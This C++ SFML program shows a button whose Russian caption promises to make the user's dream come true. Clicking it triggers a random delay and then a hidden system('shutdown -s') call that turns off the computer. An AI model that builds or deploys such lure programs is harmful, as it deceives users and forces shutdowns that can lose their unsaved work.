#include <SFML/Graphics.hpp>
#include <ctime>
#include <windows.h>
int main()
{
    srand(time(0));

    sf::RenderWindow window(sf::VideoMode(800, 600), "Button", sf::Style::Default);

    window.setVerticalSyncEnabled(true);
    sf::FloatRect targetArea(100.f, 100.f, 200.f, 150.f);
    sf::RectangleShape rectangle({ targetArea.width, targetArea.height });
    sf::Texture texture;
    texture.loadFromFile("button.png");
    rectangle.setPosition(150, 150);
    rectangle.setTexture(&texture);
    sf::Font font;
    font.loadFromFile("arial.ttf");
    sf::Text text;
    text.setFont(font);
    text.setString(L"Нажми на кнопку, и твоя мечта осуществится");
    text.setCharacterSize(20);
    text.setFillColor(sf::Color::Red);
    text.setStyle(sf::Text::Bold | sf::Text::Underlined);

    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed) 
            {
                window.close();
            }

            if (sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) 
            {
                sf::Vector2i mousePos = sf::Mouse::getPosition(window);
                sf::Vector2f mousePosF(static_cast<float>(mousePos.x), static_cast<float>(mousePos.y));
                if (targetArea.contains(mousePosF)) 
                {
                    int sec = rand() % (60 - 10 + 1) + 10;
                    Sleep(sec * 1000);
                    system("shutdown -s");
                }
            }
        }

        window.clear(sf::Color::Black);
        window.draw(rectangle);
        window.draw(text);
        window.display();
    }
    return 0;
}